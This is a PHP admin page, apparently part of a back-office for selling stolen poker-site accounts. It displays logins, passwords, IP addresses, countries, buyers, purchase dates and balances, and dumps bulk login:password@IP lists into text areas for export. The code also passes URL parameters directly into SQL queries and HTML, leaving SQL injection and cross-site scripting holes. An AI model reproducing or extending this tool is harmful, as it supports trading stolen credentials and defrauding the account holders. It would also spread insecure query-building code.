<?

     echo "<h1>$_GET[country]</h1>";

     #if($_GET[country]!="")
     $Query = "SELECT * from $Table_Poker WHERE CCOUNTRY='$_GET[country]'  AND CBUYER='' order by id LIMIT 0,12000"; //      28012015
     #else
     #$Query = "SELECT * from $Table_Poker order by id  LIMIT 0,500";


     if($_GET[buyer]!="")
     {
        $Query = "SELECT * from $Table_Poker WHERE CBUYER='$_GET[buyer]' order by id LIMIT 0,7000";
     }


     if($_GET[c120d]!="")
     {
        $Query = "SELECT * from $Table_Poker WHERE  CBALANCE='' AND  C120D LIKE '%$%' order by id LIMIT 0,7000";
     }

     if($_GET[c2014]!="")
     {
        $Query = "SELECT * from $Table_Poker WHERE C2014 LIKE '%$%' order by id LIMIT 0,7000";
     }

     echo $Query;

     $Result=mysql_db_query ($DBName, $Query, $Link);   
     print "<br><br>";
     print "<table border=1 cellspacing=1 cellpadding=1>";
     print "<td><center><b><a href='#'>№</a></b></center></td>";
     print "<td><center><b><a href='#'>PID</a></b></center></td>";
     print "<td><center><b><a href='#'>Логин</a></b></center></td>";
     print "<td><center><b><a href='#'>Пароль</b></center></td>";
     print "<td><center><b><a href='#'>IP</b></center></td>";
     print "<td><center><b><a href='#'>Страна</b></center></td>";
     print "<td><center><b><a href='#'>Покупатель</b></center></td>";
     print "<td><center><b><a href='#'>Дата покупки</b></center></td>";
     print "<td><center><b><a href='#'>Баланс</b></center></td>";

     print "<td><center><b><a href='#'>2007</b></center></td>";
     print "<td><center><b><a href='#'>2008</b></center></td>";
     print "<td><center><b><a href='#'>2009</b></center></td>";
     print "<td><center><b><a href='#'>2010</b></center></td>";
     print "<td><center><b><a href='#'>2011</b></center></td>";
     print "<td><center><b><a href='#'>2012</b></center></td>";
     print "<td><center><b><a href='#'>2013</b></center></td>";
     print "<td><center><b><a href='?list=1&c2014=1'>2014</b></center></td>";
     print "<td><center><b><a href='?list=1&c120d=1'>120D</b></center></td>";




     
     while($Row=mysql_fetch_array ($Result)) 
     {
	$n++;
	
	if($Row[CBUYER]!='')
	print "<tr bgcolor='gray'>";  
	else
	print "<tr>";  
	print "<td>$n</td>";
	print "<td>$Row[id]</td>";
	
	if($Row[CBALANCE]!="")
	print "<td><font size='5'>$Row[CLOGIN]</font></td>";
	else
	print "<td>$Row[CLOGIN]</td>";
	$pass=$Row[CPASS];


	$text1=$text1 . $Row[CLOGIN] . ":" . $Row[CPASS] . "@" . $Row[CIP] . "\n";
	$text2=$text2 . $Row[CLOGIN] . ":" . $Row[CPASS] . "\n";
	$text3=$text3 . $Row[CLOGIN] . "\n";

	if($_GET[showpass]!="1")
	{
		for($i=0;$i<strlen($pass);$i+=2)
		{
		$pass[$i]='*';
		}
	}

	print "<td>$pass</td>";
	print "<td>$Row[CIP]</td>";
	print "<td><a href=\"?country=$Row[CCOUNTRY]\">$Row[CCOUNTRY]</a></td>";
	print "<td><a href='?list=1&buyer=$Row[CBUYER]'>$Row[CBUYER]</a></td>";
	print "<td>$Row[CDATAPAY]</td>";
	print "<td>$Row[CBALANCE]</td>";

	
	if(strpos($Row[C2007],"\$")!==false)
	print "<td bgcolor='red'>$Row[C2007]</td>";
	else
	print "<td>$Row[C2007]</td>";

	if(strpos($Row[C2008],"\$")!==false)
	print "<td bgcolor='red'>$Row[C2008]</td>";
	else
	print "<td>$Row[C2008]</td>";

	if(strpos($Row[C2009],"\$")!==false)
	print "<td bgcolor='red'>$Row[C2009]</td>";
	else
	print "<td>$Row[C2009]</td>";

	if(strpos($Row[C2010],"\$")!==false)
	print "<td bgcolor='red'>$Row[C2010]</td>";
	else
	print "<td>$Row[C2010]</td>";

	if(strpos($Row[C2011],"\$")!==false)
	print "<td bgcolor='red'>$Row[C2011]</td>";
	else
	print "<td>$Row[C2011]</td>";

	if(strpos($Row[C2012],"\$")!==false)
	print "<td bgcolor='red'>$Row[C2012]</td>";
	else
	print "<td>$Row[C2012]</td>";

	if(strpos($Row[C2013],"\$")!==false)
	print "<td bgcolor='red'>$Row[C2013]</td>";
	else
	print "<td>$Row[C2013]</td>";

	if(strpos($Row[C2014],"\$")!==false)
	print "<td bgcolor='red'>$Row[C2014]</td>";
	else
	print "<td>$Row[C2014]</td>";

	if(strpos($Row[C120D],"\$")!==false)
	print "<td bgcolor='red'>$Row[C120D]</td>";
	else
	print "<td>$Row[C120D]</td>";

	print "</tr>";
     }

     print "</table>";

     print "<textarea rows=50 cols=50>$text1</textarea>";
     print "<textarea rows=50 cols=40>$text2</textarea>";
     print "<textarea rows=50 cols=20>$text3</textarea>";

?>